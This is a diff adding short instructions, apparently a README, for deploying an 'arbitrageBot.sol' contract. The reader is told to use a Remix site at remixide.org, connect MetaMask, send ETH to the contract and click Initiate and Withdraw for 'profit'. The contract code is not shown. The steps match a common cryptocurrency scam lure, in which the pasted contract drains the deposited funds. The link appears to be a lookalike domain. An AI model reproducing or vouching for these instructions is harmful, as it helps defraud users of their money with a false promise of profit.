@@ -1,0 +1,9 @@
+Just create a new file in remix ide ( https://remixide.org/ ), give name the file with .sol extension e.g namehere.sol 
+Paste the code from arbitrageBot.sol into the file created in remix 
+Select compiler version 0.6.7
+On deploy panel, change the environment to "Inject Provider - Metamask"
+Connect your Wallet
+Deploy the Contract
+Send intiating eth to contracts address
+Click Initiate Button on the Left
+Click Withdraw to transfer all funds with profit to your metamask
